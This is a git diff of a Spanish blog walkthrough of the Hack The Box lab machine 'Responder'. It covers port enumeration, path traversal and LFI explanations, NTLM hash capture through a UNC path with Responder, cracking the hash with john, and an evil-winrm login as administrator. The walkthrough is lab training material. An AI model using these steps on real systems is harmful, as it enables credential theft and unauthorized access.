@@ -949,7 +949,7 @@ rtt min/avg/max/mdev = 97.862/107.099/123.071/10.278 ms
 ```
 
 Con un TTL de 127 estamos enfrentando una máquina Windows.
-# Enumeración
+<h2 class="titulo-principal">Enumeración</h2>
 
 Lanzamos un escaneo rápido y sigiloso con nmap:
 
@@ -957,11 +957,15 @@ Lanzamos un escaneo rápido y sigiloso con nmap:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.175.41 -oG allPorts
 ```
 
-![[HTB/Starting Point/Tier 2/Responder/Images/nmap.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/nmap.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Vemos 3 puertos abiertos, quitaremos el ruido de la captura de nmap con la herramienta previamente definida en la .zshrc **extractPorts**:
 
-![[HTB/Starting Point/Tier 2/Responder/Images/extractPorts.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/extractPorts.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Con la información parseada más importante de la captura vemos los puertos `80, 5985, 7680` pero, aun necesitamos un poco más de información. Por tanto, hacemos un escaneo con nmap usando una serie de scripts básicos de reconocimiento:
 
@@ -969,16 +973,21 @@ Con la información parseada más importante de la captura vemos los puertos `80
 nmap -sCV -p80,5985,7680 10.129.175.41 -oN targeted
 ```
 
-![[HTB/Starting Point/Tier 2/Responder/Images/nmap2.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/nmap2.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Comenzado con el puerto 80, vamos a tratar de enumerar un poco más a detalle con la herramienta `whatweb`:
 
-![[HTB/Starting Point/Tier 2/Responder/Images/whatweb.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/whatweb.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Encontramos que hay un dominio **unika.htb**, es decir, que al momento de ingresar por la dirección IP el navegador no entiende y no puede resolvernos la página de la máquina, por ahora seguimos enumerando el otro puerto HTTP:
 
-
-![[whatweb2.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/whatweb2.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Sin resultados, lo siguiente sera enumerar posibles rutas comunes por el puerto 80 usando nmap con un script programado en Lua. De esta manera haremos un poco de enumeración web:
 
@@ -986,7 +995,9 @@ Sin resultados, lo siguiente sera enumerar posibles rutas comunes por el puerto 
 namp --script http-enum 10.129.175.41 -oN webScan
 ```
 
-![[HTB/Starting Point/Tier 2/Responder/Images/webScan.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/webScan.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Las rutas comunes fueron encontradas empleando un diccionario corto y no son muy prometedoras, se intenta como alternativa usar una herramienta más pesada como `gobuster` para enumerar posibles rutas comunes en el servicio web pero, haciendo uso de un diccionario más grande:
 
@@ -994,15 +1005,21 @@ Las rutas comunes fueron encontradas empleando un diccionario corto y no son muy
 gobuster dir --url 10.129.175.41 --wordlist /opt/apps/Tools/SecList/Discovery/Web-Content/directory-list-2.3-medium.txt -o dirScan
 ```
 
-![[HTB/Starting Point/Tier 2/Responder/Images/dirbust.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/dirbust.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Pero no hay nada, así que probamos agregando una búsqueda por archivos con la extensión .PHP sin resultados.
 
-![[HTB/Starting Point/Tier 2/Responder/Images/dirbust2.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/dirbust2.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Si ingresamos el dominio `unika.htb` en el navegador nos encontramos conque Firefox no entiende y no puede resolver nuestra solicitud.
 
-![[HTB/Starting Point/Tier 2/Responder/Images/web.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/web.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Por tanto, para arreglaro se agrega al archivo `/etc/hosts` la dirección IP de la máquina y el dominio.
 
@@ -1018,25 +1035,29 @@ Por tanto, para arreglaro se agrega al archivo `/etc/hosts` la dirección IP de 
 
 Al guardar el nuevo `/etc/hosts` y recargar la página en nuestro navegador, ahora si nos resuelve y encontramos una página web.
 
-![[HTB/Starting Point/Tier 2/Responder/Images/web2.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/web2.png" alt="under" oncontextmenu="return false;">
+</div>
 
-# Explotación
+<h2 class="titulo-principal">Explotación</h2>
 
 Es una página sencilla y no cuenta con muchos apartados pero, uno de ellos llama la atención y es cuando cambiamos el idioma de la página a Frances. Podemos ver que la URL cambia y tenemos una variable `page` que quizás podamos explotar.
 
-![[web3.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/web3.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Intentamos con un Path Trasversal:
 
----
-# ¿Qué es Path Trasversal?
+<hr />
+<h3 class="titulo-secundario">¿Qué es Path Trasversal?</h3>
 
 Un directory traversal (o salto de directorio o cruce de directorio o path traversal) consiste en explotar una vulnerabilidad informática que ocurre cuando no existe suficiente seguridad en cuanto a la validación de un usuario, permitiéndole acceder a cualquier tipo de directorio superior (padre) sin ningún control.
 
 La finalidad de este ataque es ordenar a la aplicación a acceder a un archivo al que no debería poder acceder o no debería ser accesible. Este ataque se basa en la falta de seguridad en el código. El software está actuando exactamente como debe actuar y en este caso el atacante no está aprovechando un bug en el código.
 
 Directory traversal también es conocido como el ../ ataque punto punto barra, escalado de directorios y backtracking. 
-## Ejemplo
+<a><strong>Ejemplo</strong></a>
 
 Un ejemplo típico de una aplicación vulnerable es:
 
@@ -1071,20 +1092,24 @@ La repetición de los caracteres `../` después de '/home/users/paloloco/templat
 
 El archivo de contraseñas de UNIX es un archivo que se utiliza comúnmente para realizar el **directory traversal**, y es utilizado frecuentemente para [crackear](https://es.wikipedia.org/wiki/Password_cracking "Password cracking") las contraseñas.
 
----
+<hr />
 
 Intentamos hacer Path Trasversal con la variable `page`:
 
-![[web4.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/web4.png" alt="under" oncontextmenu="return false;">
+</div>
 
 No podemos hacer Path Trasversal pero, recordando que hay un puerto 7680:
 
-![[pando.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/pando.png" alt="under" oncontextmenu="return false;">
+</div>
 
 El puerto `7680` pando-pub usa el Protocolo de Control de Transmisión. TCP es uno de los protocolos principales en redes TCP/IP. TCP es un protocolo orientado en la conexión, necesita el apretón de manos para determinar comunicaciones de principio a fin. Solo cuando la conexión es determinada, los datos del usuario pueden ser mandados de modo bidireccional por la conexión.
 
-----
-# ¿Qué es Local File Inclusion LFI?
+<hr />
+<h3 class="titulo-secundario">¿Qué es Local File Inclusion LFI?</h3>
 
 LFI son vulnerabilidades web que son posibles gracias a errores por parte de los programadores. Al introducir un descuido de seguridad en las aplicaciones web, los programadores descuidados permiten que usuarios no autorizados accedan a archivos, aprovechen la funcionalidad de descarga, naveguen por la información disponible y mucho más.
 
@@ -1109,10 +1134,14 @@ https://example.com/?page=../../../../etc/test.txt
 
 En este caso, lo único que tuvo que hacer el ciberdelincuente fue sustituir “nombrearchivo.php” por “../../../etc/test.txt” en la URL de la ruta y, et voilà, pudo acceder al archivo de prueba. En esta fase, el intruso o intrusos podrían cargar un script malicioso en su servidor y acceder a ese script utilizando local file inclusion.
 
-----
+<hr />
 
 Gracias a este protocolo podemos probar con la herramienta `responder` a intentar un LFI:
-![[responder2.png]]
+
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/responder2.png" alt="under" oncontextmenu="return false;">
+</div>
+
 
 > **NTLM** es una colección de protocolos creados por MS, permite autenticar usuarios con un dominio usando un desafío y si las respuestas coinciden el servidor permite el acceso.
 
@@ -1124,35 +1153,55 @@ Aquí entra `responder`, así podremos crear un SMB Malicioso tal que, cuando la
 
 Ejecutamos `sudo python3 responder.py -I tun0`:
 
-![[responder3.png]]
+
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/responder3.png" alt="under" oncontextmenu="return false;">
+</div>
+
 
 Y en la URL intentamos cargar un archivo cualquiera usando nuestra dirección IP de la VPN '//10.10.16.84/file'
 
-![[responder4.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/responder4.png" alt="under" oncontextmenu="return false;">
+</div>
+
 
 Revisamos nuevamente `responder` y obtenemos el Hash. Luego, este Hash podemos guardarlo en un archivo '.txt' y podemos usar la herramienta `john the ripper` para 'Crackear' la contraseña.
 
-![[hash.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/hash.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Para ello usamos `john` y el diccionario `rockyou.txt` y le pasamos el Hash.
 
-![[hash2.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/hash2.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Y obtenemos la contraseña del usuario 'Administrator:badminton'. Para entablar una conexión usamos la herramienta `evil-winrm`, posterior instalamos las gemas necesarias:
 
-![[winrm.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/winrm.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Y ahora podemos ejecutar:
 
-![[winrm2.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/winrm2.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Entramos con `-i 10.129.175.41 -u administrator -p badminton`:
 
-![[intrusion.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/intrusion.png" alt="under" oncontextmenu="return false;">
+</div>
 
 Y con un poco de búsqueda encontramos la flag:
 
-![[HTB/Starting Point/Tier 2/Responder/Images/flag.png]]
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/flag.png" alt="under" oncontextmenu="return false;">
+</div>
+
  y hemos completado la máquina.
 
 <hr />
@@ -1352,8 +1401,8 @@ www-data@host:/$ export SHELL=bash
 ```
 
 
-- `export TERM=xterm` -> Debemos hacer esto ya que a pesar de haberle indicado que queríamos una **xterm** al momento de reiniciarlo la variable de entorno **TERM** vale **dump** (Se usa esta variable para poder usar los atajos de teclado).
-- `export SHELL=bash` -> Para que nuestra shell sea una bash.
+1. export TERM=xterm` -> Debemos hacer esto ya que a pesar de haberle indicado que queríamos una **xterm** al momento de reiniciarlo la variable de entorno **TERM** vale **dump** (Se usa esta variable para poder usar los atajos de teclado).
+2. export SHELL=bash` -> Para que nuestra shell sea una bash.
 ---
 
 
